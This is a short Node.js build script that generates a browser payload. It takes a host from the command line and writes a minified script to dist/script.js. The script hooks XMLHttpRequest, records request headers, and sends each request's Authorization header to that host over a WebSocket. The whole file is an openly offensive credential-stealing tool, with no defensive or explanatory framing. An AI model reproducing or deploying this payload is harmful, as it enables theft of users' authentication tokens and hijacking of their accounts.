const { promises: fs, constants: fsConstants } = require('fs')

function genScript (url) {
  return `XMLHttpRequest.prototype.wrappedSetRequestHeader=XMLHttpRequest.prototype.setRequestHeader,XMLHttpRequest.prototype.setRequestHeader=function(e,t){this.wrappedSetRequestHeader(e,t),this.headers||(this.headers={}),this.headers[e]||(this.headers[e]=[]),this.headers[e].push(t)};const wrappedXHROpen=window.XMLHttpRequest.prototype.open;window.XMLHttpRequest.prototype.open=function(e,t,s,p,o){return this.addEventListener("load",function(){const[e]=this.headers.Authorization,t=new WebSocket("ws://${url}");t.onopen=(()=>{t.send(e)})}),wrappedXHROpen.apply(this,arguments)};`
}

function isFileOrFolderExists (path) {
  return new Promise((resolve) => {
    fs.access(path, fsConstants.F_OK)
      .then(() => resolve(true))
      .catch(() => resolve(false))
  })
}

const url = process.argv[2];

(async () => {
  const isFolderExist = await isFileOrFolderExists('./dist/')
  const isFileExist = await isFileOrFolderExists('./dist/script.js')

  if (!isFolderExist) {
    fs.mkdir('./dist/')
  }

  if (!isFileExist) {
    fs.appendFile('./dist/script.js', genScript(url))
      .then(() => console.log('done'))
  } else {
    fs.writeFile('./dist/script.js', genScript(url))
      .then(() => console.log('done'))
  }
})()
